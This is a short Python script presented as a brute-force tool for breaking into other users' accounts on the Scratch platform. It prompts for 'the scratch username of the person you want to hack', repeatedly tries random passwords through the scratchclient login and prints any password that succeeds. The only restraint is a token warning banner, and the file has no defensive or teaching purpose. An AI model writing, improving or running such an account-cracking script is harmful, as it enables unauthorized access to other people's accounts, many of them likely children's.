# Comments

# If you are wondering what '\033[93' is,
# they just change the color of the text


#imports
import os
try:
  from scratchclient import ScratchSession as s
except:
  os.system('pip install scratchclient')
  os.system('clear')
import random

# Program
print('Brute-force is ready')
print('This will take some time')
print('\n\033[93mWarning: DO NOT USE THIS FOR ILLEGAL PURPOSES')
loop = True
while loop == True:
  ic = input('\n\033[0mContinue? (Y/n) ')
  if ic == 'n':
    exit(0)
  elif ic == 'Y':
    start = True
    os.system('clear')
    loop = False
  else:
    loop = True

debug = False
mdebug = False

# ask for the username
susername = input('What is the scratch username of the person you want to hack? ')
os.system('clear')
print('Brute-force started')

# list for brute-force to choose from
alpb = 'A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z ~ ! @ # $ % ^ & * ( ) _ + - = [ ] { } : ; \' " \\ | , . < > / ? ` 1 2 3 4 5 6 7 8 9'.split(' ')

# make a class for the password to be in
class rpassc:
  rpass = ''


# make a class for debug
class numc:
  num = 1
  mnum = 1

# repeat until password found
on = True
while on:
  # make a list for the charecters of the password to be added to
  tpass = []
  # generate a random password
  for i in range(0, random.randint(8, 25)):
    tpass.append(random.choice(alpb))
    if mdebug == True:
      print(f'Password gen at character {numc.num}.{numc.mnum} Done with value {tpass[i]}')
      numc.mnum += 1
  tpass = "".join(str(x) for x in tpass)
  # try to login with the generated password
  try:
    scratch = s(susername, tpass)
    rpassc.rpass = tpass
  # if the password is correct, stop the loop
    on = False 
  except:
  # if password is wrong, repeat the process
    on = True
  if debug == True:   
    print(f'Cycle number {numc.num} Done with password {tpass}')
    numc.mnum = 1
    numc.num += 1
# when the loop is done AKA when the password is correct, display it to the user
print('\n\nBrute-force is done.')
print(f'The password is {rpassc.rpass}')
